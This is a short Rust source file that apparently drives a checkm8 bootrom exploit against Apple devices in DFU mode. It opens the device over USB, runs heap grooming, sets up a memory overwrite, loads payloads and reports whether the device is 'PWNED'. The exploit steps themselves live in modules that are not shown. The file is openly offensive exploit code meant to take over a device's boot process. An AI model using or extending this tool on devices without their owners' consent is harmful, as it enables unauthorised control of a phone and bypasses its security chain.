mod checkm8;
mod usbexec;

use std::{time::Duration, ptr::NonNull};
//use libusb1_sys::libusb_open_device_with_vid_pid;

use libusb1_sys::libusb_init;

use crate::{usbexec::{reconnect_device, aquire_device, is_pwn_dfu}, checkm8::{heap_grooming, setup_overwrite, load_payloads}};

fn main() {
    unsafe { libusb_init(std::ptr::null_mut()) };
    let vid: u16 = 0x5ac;
    let pid: u16 = 0x1227;
    println!("Looking for device VID:0x5AC PID:1227...");
    //let context = Context::new().unwrap();
    let mut _handle = aquire_device(vid, pid);


    //let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), vid , pid);
    let dev = aquire_device(vid, pid);
    _handle = reconnect_device(NonNull::new(dev).unwrap(), vid, pid, Duration::from_secs(1));
            
    println!("Grooming the Heaps...");
    heap_grooming(vid, pid);

    println!("Setup overwrite...");
    setup_overwrite(vid, pid);
    
    println!("Loading payloads...");
    load_payloads(vid, pid);

    let dev = reconnect_device(NonNull::new(dev).unwrap(), vid, pid, Duration::from_secs(5));

    if is_pwn_dfu(dev) == true {
        println!("PWNED!!!!!")
    } else {
        println!("not pwned :(")
    }
}